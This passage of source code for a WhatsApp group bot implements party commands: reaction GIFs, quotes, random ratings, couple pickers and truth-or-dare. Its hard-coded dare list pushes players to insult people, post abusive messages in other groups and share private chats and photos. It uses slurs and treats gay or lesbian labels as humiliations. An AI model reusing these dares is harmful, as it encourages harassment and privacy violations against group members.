            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} spanked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} spanked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'feed': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/feed`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} fed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} fed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'tickle': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/tickle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} tickled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} tickled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
			case 'quotes':{
const quoteKevinou = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quoteKevinou.data.quote.body}\n\n*${themeemoji} Auteur:* ${quoteKevinou.data.quote.author}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: textquotes
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'truth': case 'dare': {
	bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez Cliquer Sur Le Bouton Suivant`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Truth 🌝\",\"id\":\"${prefix}turut"}`
            },
{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Dare 🌚\",\"id\":\"${prefix}dere"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'dere':{
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner xeon through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const kevdare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose DARE_\n'+ kevdare
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}dare"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
              break
                            break
       case 'turut':{
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, xeon?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const kevtruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose TRUTH_\n'+ kevtruth
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}truth"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
              break
			case 'pickupline': {
try {
    let res = await fetch(`https://api.popcat.xyz/pickuplines`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: pickupLine
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break
			case 'piquer': {
            	if (!m.isGroup) return KevStickGroup()
            	if (!text) return replygckev(`What do you want to pick?\nExemple: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await Kev.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let kevshimts = member[Math.floor(Math.random() * member.length)]
             let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Le plus *${text}* ici *@${kevshimts.split("@")[0]}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [kevshimts], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
             
         }
     break
			case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${themeemoji} *Fact:* ${data.fact}\n`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
    }
    break
			case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const kevkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevkak
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
break
            case 'ame-soeur': {
            if (!m.isGroup) return KevStickGroup()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `

@${me.split('@')[0]}\n\n     👫Votre ame soeur est     \n\n@${jodoh.split('@')[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/soulmate.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀❤️\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [me, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return KevStickGroup()
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `💏 Incroyable\n\n@${orang.split('@')[0]}\n\n      et    \n\n@${jodoh.split('@')[0]}\n\nSortent ensemble❤️💖👀`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/couple.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀❤️\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [orang, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
			case 'puis-je': {
            	if (!text) return replygckev(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'estce-vrai': {
            	if (!text) return replygckev(`Ask question\n\nExemple : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'quand': {
            	if (!text) return replygckev(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'quest-ceque': {
            	if (!text) return replygckev(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
